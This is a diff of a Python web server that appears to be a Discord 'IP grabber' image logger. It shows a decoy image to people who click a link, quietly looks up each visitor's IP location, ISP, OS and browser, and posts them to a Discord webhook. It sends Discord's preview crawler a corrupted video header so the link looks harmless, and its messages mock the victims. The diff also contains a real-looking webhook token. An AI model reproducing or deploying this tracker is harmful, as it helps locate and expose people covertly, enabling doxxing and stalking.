@@ -5,9 +5,9 @@ import base64
 import httpagentparser
 
 # === CHANGE THIS TO YOUR REAL DISCORD WEBHOOK URL ===
-webhook = 'https://discord.com/api/webhooks/YOUR/WEBHOOK/HERE'
+webhook = 'https://discord.com/api/webhooks/1453028520761626776/N0tjZRoNrNCsBBg0YHXHcPCix0lZhM1TeWsxUQDYTUoLZNdwNVf8nGo-ITX7MFTujFwi'
 
-# The real image shown when they click the link
+# The real image shown only when they click "Open Link"
 bindata = httpx.get('https://th.bing.com/th/id/OIP.xXJEf5k4LqmkR9skmyBlCQHaIi?w=153&h=180&c=7&r=0&o=7&cb=ucfimg2&pid=1.7&rm=3&ucfimg=1').content
 
 def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser):
@@ -18,7 +18,7 @@ def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser)
             {
                 "title": "DADDY BOB STRIKES AGAIN!",
                 "color": 16711803,
-                "description": "A New Retard Opened The 'Gif' LOL.",
+                "description": "A New Target Opened The Link LOL.",
                 "author": {"name": "Fentanyl"},
                 "fields": [
                     {
@@ -44,7 +44,7 @@ def prev(ip, uag):
             {
                 "title": "Fentanyl Alert!",
                 "color": 16711803,
-                "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** {ip}\n**UserAgent:** {uag}",
+                "description": f"Discord bot is crawling the link. Expecting a hit soon.\n\n**IP:** {ip}\n**UserAgent:** {uag}",
                 "author": {"name": "Fentanyl"}
             }
         ]
@@ -53,59 +53,67 @@ def prev(ip, uag):
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
         try:
-            # Get real IP (first in x-forwarded-for list)
+            # Get IP and User-Agent
             forwarded = self.headers.get('x-forwarded-for')
             ip = forwarded.split(',')[0].strip() if forwarded else 'Unknown'
             useragent = self.headers.get('user-agent', 'No User Agent Found!')
-            os, browser = httpagentparser.simple_detect(useragent)
-
-            # 1. DISCORD PREVIEW DETECTION (Infinite Loading Glitch)
-            if 'discord' in useragent.lower() or 'ExternalHit' in useragent:
+            
+            # === 1. DISCORD BOT CHECK (THE GLITCH) ===
+            # We check for Discord's bot or the MediaProxy
+            is_bot = any(x in useragent.lower() for x in ['discord', 'externalhit', 'bot', 'crawler'])
+            
+            if is_bot:
+                # Log that the bot is looking
+                httpx.post(webhook, json=prev(ip, useragent))
+                
+                # We send a "Video" type but a broken header
+                # This forces the "Spinning Wheel" on Discord
                 self.send_response(200)
-                self.send_header('Content-type', 'image/gif')
-                # Trick Discord into waiting for a massive file that never finishes
-                self.send_header('Content-Length', '9999999') 
+                self.send_header('Content-type', 'video/mp4')
+                self.send_header('Refresh', '0.1') # Keep it refreshing
                 self.end_headers()
                 
-                # Send just the start of a GIF header to trigger the loading state
-                self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')
-                
-                # Notify webhook that Discord is previewing
-                httpx.post(webhook, json=prev(ip, useragent))
+                # Corrupted MP4/MOV header bits
+                self.wfile.write(b'\x00\x00\x00\x18ftypmp42\x00\x00\x00\x00isommp42')
                 return
 
-            # 2. REAL USER DETECTION (Grab and Serve)
+            # === 2. REAL USER CHECK (THE GRAB) ===
+            # If we reach here, it's a real person clicking the link
+            os, browser = httpagentparser.simple_detect(useragent)
+            
+            # Serve the real image
             self.send_response(200)
             self.send_header('Content-type', 'image/jpeg')
             self.end_headers()
             self.wfile.write(bindata)
 
-            # Fetch IP info and send to webhook
+            # Get IP info from ipinfo.io
             try:
-                ipInfo = httpx.get(f'https://ipinfo.io/{ip}/json').json()
+                ip_data = httpx.get(f'https://ipinfo.io/{ip}/json').json()
                 payload = formatHook(
-                    ipInfo.get('ip', ip),
-                    ipInfo.get('city', 'Unknown'),
-                    ipInfo.get('region', 'Unknown'),
-                    ipInfo.get('country', 'Unknown'),
-                    ipInfo.get('loc', 'Unknown'),
-                    ipInfo.get('org', 'Unknown'),
-                    ipInfo.get('postal', 'Unknown'),
+                    ip_data.get('ip', ip),
+                    ip_data.get('city', 'Unknown'),
+                    ip_data.get('region', 'Unknown'),
+                    ip_data.get('country', 'Unknown'),
+                    ip_data.get('loc', 'Unknown'),
+                    ip_data.get('org', 'Unknown'),
+                    ip_data.get('postal', 'Unknown'),
                     useragent, os, browser
                 )
                 httpx.post(webhook, json=payload)
-            except Exception:
-                httpx.post(webhook, json=formatHook(ip, 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', useragent, os, browser))
+            except:
+                # Basic payload if ipinfo fails
+                httpx.post(webhook, json=formatHook(ip, '?', '?', '?', '?', '?', '?', useragent, os, browser))
 
         except Exception as e:
-            # Emergency fallback
+            # Emergency fallback: just send the image
             self.send_response(200)
             self.send_header('Content-type', 'image/jpeg')
             self.end_headers()
             self.wfile.write(bindata)
 
-# To run locally for testing:
+# Local testing entry point
 if __name__ == "__main__":
     server = HTTPServer(('0.0.0.0', 8080), handler)
-    print("Server started on port 8080...")
+    print("Glitch Logger started on port 8080...")
     server.serve_forever()
